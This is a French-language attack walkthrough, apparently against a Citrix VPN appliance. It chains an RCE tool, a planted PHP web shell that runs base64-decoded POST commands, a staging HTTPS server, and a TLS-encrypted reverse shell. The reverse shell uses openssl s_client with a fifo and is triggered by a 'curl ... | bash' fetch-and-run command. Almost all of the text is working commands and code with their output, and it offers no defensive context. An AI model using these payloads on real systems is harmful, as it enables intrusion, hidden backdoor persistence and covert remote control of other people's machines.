# Reverse shell via openssl


## Création d'un Python HTTPS server

```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 4443), SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./cert_serv.pem', server_side=True)
httpd.serve_forever()
```

Création du certificat TLS:

```bash
openssl req -new -x509 -keyout cert_serv.pem -out cert_serv.pem -days 365 -nodes
```

Utilisation:

```bash
python2 ./https.py
```

## Code backdoor

Fichier "back.php": 

```php
<?php system(base64_decode($_POST['x'])); ?>
```

Test de la backdoor:

```bash
(host) -> docker run -v ${PWD}:/opt/src --rm -ti php:alpine /bin/ash

(docker) -> # ip a s eth0
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.4/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
(docker) -> # cd opt/src
/opt/src # php -S 0.0.0.0:1337
[Fri Feb 21 11:37:57 2020] PHP 7.4.2 Development Server (http://0.0.0.0:1337) started
```

Envoi de la commande curl:

```bash
(host) -> curl -k http://172.17.0.4:1337/back.php -d "x=`echo 'id' | base64`"

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## Exploitation de la RCE et upload de la backdoor

Lancer le serveur python https:

```bash
python ./https.py
```

Avec le tool de mpgn:

```bash
(host) -> command > curl -k https://192.168.55.1:4443/back.php -o /var/vpn/themes/back.php
[+] Adding bookmark 7QDFBBVO4SZ9.xml
[+] Bookmark added
[+] Result of the command: 

```

Trigger de la backdoor:

```bash
(host) -> curl -k https://192.168.55.123/vpn/themes/back.php -d "x=$(echo 'id' | base64)"

uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
```

## Reverse shell openssl

Check si openssl est installé:

```bash
(host) -> curl -k https://192.168.55.123/vpn/themes/back.php -d "x=$(echo 'which openssl' | base64)"

/usr/bin/openssl
```

Génération d'une paire de clé pour le rev shell:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout priv.key -out cert.crt
```

Copie du certificat dans le dossier du serveur https:

```bash
cp cert.crt PATH/TO/https
```

Ouverture de la socket openssl:

```bash
openssl s_server -quiet -key priv.key -cert ../https/cert.crt -port 8443
```

Script pour trig le reverse shell openssl

```bash
#!/bin/sh

IP_ATTACKER="192.168.55.1"
REMOTE_CRT_PATH="/var/vpn/themes/cert.crt"
OPENSSL_PATH=$(which openssl)

curl -k https://${IP_ATTACKER}:4443/cert.crt -o ${REMOTE_CRT_PATH}

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ${OPENSSL_PATH} s_client -quiet -CAfile ${REMOTE_CRT_PATH} -verify_return_error -verify 1 -connect ${IP_ATTACKER}:8443 > /tmp/s; rm /tmp/s
```

Trigger du rev shell TLS:

```bash
(host) -> curl -k https://192.168.55.123/vpn/themes/back.php -d "x=$(echo 'curl -k https://192.168.55.1:4443/revopenssl.sh | bash' | base64)"
```

Dans le terminal avec le openssl en attente: 

```bash
(host) -> openssl s_server -quiet -key priv.key -cert ../https/cert.crt -port 8443  
sh: can't access tty; job control turned off
(citrix) -> $ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
```

